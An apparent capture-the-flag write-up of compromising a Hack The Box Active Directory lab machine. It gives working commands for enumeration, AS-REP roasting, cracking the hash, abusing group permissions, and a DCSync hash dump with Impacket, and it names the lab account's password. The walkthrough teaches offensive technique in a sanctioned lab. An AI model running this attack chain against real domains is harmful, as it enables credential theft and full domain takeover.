
### Initial Reconnaissance

```bash
rustscan -a 10.129.41.5 -- -Pn -sCV -oN tcp-nmap.txt
```
I prefer to use rustscan because it is quicker and by passing it `-- -Pn -sCV -oN tcp-nmap.txt`, it will take the open ports and feed those into a Nmap scan with the -sC/-sV flags and output that into a file for me.
<img width="1220" height="463" alt="image" src="https://github.com/user-attachments/assets/c3606784-04cd-4232-b75e-17a8fa615098" />


```bash
sudo nmap -sU --top-ports 20 --open -oN udp-nmap-top20.txt 10.129.41.5
```
I always run this just in case. You never know what UDP ports may be open!
<img width="964" height="254" alt="image" src="https://github.com/user-attachments/assets/86f2fd79-2184-4c1a-b883-e90fc46b29ee" />


### Service Enumeration

Because we see tcp/88 (Kerberos) and tcp/389 (LDAP) open on the target, we can assume this is a Domain Controller

Checking for low hanging fruit first, we can try an anonymous LDAP bind and null/guest SMB authentication, followed by RPC on tcp/135

#### LDAP Testing

Anonymous Binding is not allowed:
<img width="1180" height="317" alt="image" src="https://github.com/user-attachments/assets/eb7e3558-df2f-42c5-9545-a25f93b93cf6" />

#### SMB Testing
Null authentication and guest authentication are not allowed:
<img width="1482" height="181" alt="image" src="https://github.com/user-attachments/assets/227b17f8-5982-48fc-88d7-26d5bcbac461" />

#### RPC Testing
Because RPC is open, we can use Enum4Linux-NG to check for any information there:
```bash
enum4linux-ng -A 10.129.41.5
```
Viewing the output, we see that we are able to enumerate users on the target:
<img width="1596" height="774" alt="image" src="https://github.com/user-attachments/assets/150dcac2-99c7-4937-976d-c39646a73254" />

Using this, we can create a users list to then check for things like AS-REP Roastable users - To create the user list:
1. Copy the user data from Enum4Linux to a file called temp.txt
2. Pull just the usernames and put those into a new file by running `cat temp.txt | grep "username" | awk '{print $2}' > users.txt`
<img width="1026" height="558" alt="image" src="https://github.com/user-attachments/assets/c581453a-7368-4146-9fe5-d98610109853" />

### AS-REP Roasting

Next, we can use Netexec to perform our AS-REP Roast attack. AS-REP Roasting is an attack that targets Active Directory user accounts who have Kerberos pre-authentication disabled. This allows for attackers to request a Ticket Granting Ticket (TGT) containing the hash of the user's password, which could be cracked offline via tools like Hashcat or John the Ripper.

```bash
nxc ldap 10.129.41.5 -u users.txt -p '' --asreproast asrep.txt --dns-server 10.129.41.5
```
<img width="2539" height="327" alt="image" src="https://github.com/user-attachments/assets/f9e77669-29a5-4ea7-9a93-77a499abeb6e" />

We are able to retrieve the hash for the user svc-alfresco, and that was automatically stored to the file "asrep.txt" - We can now use John to crack this hash

```bash
john --wordlist=/usr/share/wordlist/rockyou.txt asrep.txt
```
<img width="1142" height="192" alt="image" src="https://github.com/user-attachments/assets/67b40a50-c5f1-46f3-a020-af75c7d6bb2a" />

We were successfully able to crack it and obtained the password for the user svc-alfresco (s3rvice)

### Domain Enumeration

With credentials, the first thing I like to try is a spray against all available Netexec modules to see what we can access as our new user. I do this with a tool called nxcspray (https://github.com/NTHSec/nxcspray).

```bash
nxcspray all 10.129.41.5 -u 'svc-alfresco' -p 's3rvice'
```
<img width="1612" height="357" alt="image" src="https://github.com/user-attachments/assets/e67bb9a8-24c3-485c-87f3-d9f032dbf407" />

We see that our user does have WinRM shell access to the target, but before I do that, I want to collect data for Bloodhound and perform an analysis there:
(At this point, you can also login via WinRM to get your user flag)

```bash
bloodhound-python -u 'svc-alfresco' -p 's3rvice' -d 'htb.local' -ns 10.129.41.5 -c all --zip
```
Once uploaded, we can see that our owned user is a part of a couple groups which provide some special privileges:

<img width="1344" height="341" alt="image" src="https://github.com/user-attachments/assets/0fb9fac4-8072-4b29-b428-31d15955a54c" />

Checking for the shortest path to the Administrator user, Bloodhound presents us with this:

<img width="2261" height="160" alt="image" src="https://github.com/user-attachments/assets/100cda51-8b29-4c3b-9687-d16c9b6872d6" />

### Privilege Escalation

Because of the groups our user is a member of, we have GenericAll permissions over the "Exchange Windows Permissions" group. When we have GenericAll (sometimes called full control) over a group, we can directly modify that group's membership, allowing us to add ourselves to the group.
So, let's add ourselves to that group by using the following command:

```bash
net rpc group addmem "Exchange Windows Permissions" "svc-alfresco" -U "htb.local"/"svc-alfresco"%"s3rvice" -S 10.129.41.5
```
<img width="1379" height="99" alt="image" src="https://github.com/user-attachments/assets/84758006-c36e-4bb4-9a5c-8a3265363fcd" />

Now that we have done that, we are now in a group that has WriteDACL permission over the domain. This is very dangerous because it allows us to have full control over the domain. With full control over the domain, we can give ourselves 'DCSync' rights over the domain and perform a DCSync attack.

To exploit this, we first grant ourselves permission to perform a DCSync by using Imapcket's dacledit.py:

```bash
impacket-dacledit -action 'write' -rights 'DCSync' -principal 'svc-alfresco' -target-dn 'DC=HTB,DC=LOCAL' 'htb.local'/'svc-alfresco':'s3rvice'
```
<img width="1675" height="133" alt="image" src="https://github.com/user-attachments/assets/1cb4f83e-32f7-4354-b0dc-594150615463" />

Then, we can use Impacket's secretsdump.py to perform our DCSync as svc-alfresco:

```bash
impacket-secretsdump htb.local/svc-alfresco:s3rvice@10.129.41.5
```
<img width="1241" height="605" alt="image" src="https://github.com/user-attachments/assets/6df13192-bc51-4fee-a6cf-af1ef7796489" />

With the Administrator hash, we can now attempt to access the host via WinRM:

<img width="1169" height="243" alt="image" src="https://github.com/user-attachments/assets/8b12c568-ad42-48ea-a1f7-9e19f0d03d3c" />

And we can, so we have successfully owned this target!
(At this point, we can grab the root flag as well)
